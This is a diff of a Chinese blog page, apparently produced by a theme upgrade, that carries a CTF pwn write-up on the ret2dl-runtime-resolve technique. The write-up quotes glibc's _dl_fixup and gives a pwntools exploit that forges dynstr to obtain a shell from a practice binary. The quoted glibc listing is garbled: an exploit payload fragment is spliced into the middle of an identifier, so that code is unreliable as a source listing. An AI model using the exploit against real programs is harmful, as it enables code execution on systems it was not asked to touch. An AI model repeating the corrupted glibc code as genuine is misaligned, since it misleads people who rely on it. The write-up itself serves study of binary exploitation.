@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,92 +190,112 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        ret2dl-runtime-resolve
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">ret2dl-runtime-resolve</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-02-03 11:22:31
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/ret2dl-runtime-resolve/">ret2dl-runtime-resolve</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2022-02-03 11:22:31</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>2.7k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>12 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 29 2022 19:35:58 GMT+0800">2022-03-29 19:35:58</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/pwn/">pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/ret2dl-runtime-resolve/">ret2dl-runtime-resolve</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>12 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <p>前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。</p>
 <h2 id="ret2dl-runtime-resolve"><a href="#ret2dl-runtime-resolve" class="headerlink" title="ret2dl-runtime-resolve"></a>ret2dl-runtime-resolve</h2><p>首先ELF文件的引用外部文件的加载方式分为三种FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在后面两种的情况下存在地址延迟加载。</p>
-<h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO_RELRO"></a>NO_RELRO</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203123130058.png"
-                      alt="image-20220203123130058"
-                ></p>
+<h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO_RELRO"></a>NO_RELRO</h3><p><img   src="/images/image-20220203123130058.png"  alt="image-20220203123130058"></p>
 <p>可以看到在第一次调用read函数的时候，此时会先根据GOT表的位置进行jmp到read@plt+6的位置，然后经过两次push之后到_dl_runtime_resolve函数。</p>
 <p>在源码中dl_runtime_resolve函数只是call了一下_dl_fixup函数。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset  </span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg  </span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">DL_FIXUP_VALUE_TYPE  </span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  </span><br><span class="line">_dl_fixup (  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span></span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span>  </span></span><br><span class="line">    struct link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab  </span></span><br><span class="line"><span class="function">        </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc  </span><br><span class="line">        = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="keyword">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=  </span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMID<span class="meta"># payload = p64(0)+p64(0x4011DD)+b<span class="meta-string">&#x27;\x00&#x27;</span>*(0x58-0x10)+p64(fake_dynrel_addr) + \</span></span><br><span class="line"><span class="meta">#     p64(pop_rdi)+p64(bss+0xa0-0x8) +\</span></span><br><span class="line"><span class="meta">#     p64(plt_load)+p64(fake_link_map_addr)+p64(0)</span></span><br><span class="line"><span class="meta"># payload = payload.ljust(0xa0-8, b<span class="meta-string">&#x27;\x00&#x27;</span>)+b<span class="meta-string">&#x27;/bin/sh\x00&#x27;</span> + \</span></span><br><span class="line"><span class="meta">#     p64(bss+0x58)+p64(leave_ret)</span></span><br><span class="line"><span class="meta"># gdb.attach(r)X (DT_VERSYM)]);  </span></span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                version = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//得到结果   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//将结果写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
@@ -235,56 +305,26 @@
 
 <p>现在我们创建这样一个漏洞程序。</p>
 <p>在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造dynstr。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203130733878.png"
-                      alt="image-20220203130733878"
-                ></p>
+<p><img   src="/images/image-20220203130733878.png"  alt="image-20220203130733878"></p>
 <p>可以看到上面是有可读可写的权限的。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203131754166.png"
-                      alt="image-20220203131754166"
-                ></p>
+<p><img   src="/images/image-20220203131754166.png"  alt="image-20220203131754166"></p>
 <p>指向的位置存在这样几个字符串。</p>
 <p>exp如下:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp = <span class="number">0x0804848b</span></span><br><span class="line">leave_ret = <span class="number">0x08048358</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt_load = elf.plt[<span class="string">&#x27;read&#x27;</span>]+<span class="number">6</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">target = <span class="number">0x804961C</span>+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">0x4</span>)+p32(pop_ebp)+p32(bss+<span class="number">0x300</span>) + \</span><br><span class="line">    p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(bss+<span class="number">0x300</span>)+p32(<span class="number">0x1000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">fake_str = <span class="string">b&#x27;\x00libc.so.6\x00_IO_stdin_used\x00system\x00&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(read_plt)+p32(read_plt_load) + \</span><br><span class="line">    p32(<span class="number">0</span>)+p32(target)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)+fake_str</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(bss+<span class="number">0x350</span>)+<span class="string">b&#x27;;sh&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>64位相较于32位比较类似，又因为参数是在寄存器内保存的所以，直接一次ROP即可解决。</p>
 <h3 id="PARTIAL-RELRO"><a href="#PARTIAL-RELRO" class="headerlink" title="PARTIAL_RELRO"></a>PARTIAL_RELRO</h3><p>首先再更深层次的观察_dl_runtime_resolve函数的作用。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203144803843.png"
-                      alt="image-20220203144803843"
-                ></p>
+<p><img   src="/images/image-20220203144803843.png"  alt="image-20220203144803843"></p>
 <p>这一步和上面一样，但是上面没有提到这两个push的作用，先继续往后看。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203144853692.png"
-                      alt="image-20220203144853692"
-                ></p>
+<p><img   src="/images/image-20220203144853692.png"  alt="image-20220203144853692"></p>
 <p>上面的0是reloc_arg，下面的0xf7ffd918则是link_map的地址。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220203145142419.png"
-                      alt="image-20220203145142419"
-                ></p>
+<p><img   src="/images/image-20220203145142419.png"  alt="image-20220203145142419"></p>
 <p>通过这个地址即可找到.dynamic的地址，也就是上图中的第三个</p>
 <blockquote>
-<p>.dynamic：是ld.so使用的动态链接信息，在/etc/ld.so.conf文件中存放着需要动态加载的目录，使用ldconfig就可以将ld.so.conf中的指定目录的库文件加载到内存中，并记录在/etc/ld.so.cache文件中。ld.so.1文件就可以在高速缓存中访问动态库文件，提高访问速度。导入动态链接库，可以在/etc/ld.so.conf文件中配置，或者使用LD_LIBRARY_PATH环境变量进行引用。</p>
+<p>.dynamic：是ld.so使用的动态链接信息，在&#x2F;etc&#x2F;ld.so.conf文件中存放着需要动态加载的目录，使用ldconfig就可以将ld.so.conf中的指定目录的库文件加载到内存中，并记录在&#x2F;etc&#x2F;ld.so.cache文件中。ld.so.1文件就可以在高速缓存中访问动态库文件，提高访问速度。导入动态链接库，可以在&#x2F;etc&#x2F;ld.so.conf文件中配置，或者使用LD_LIBRARY_PATH环境变量进行引用。</p>
 </blockquote>
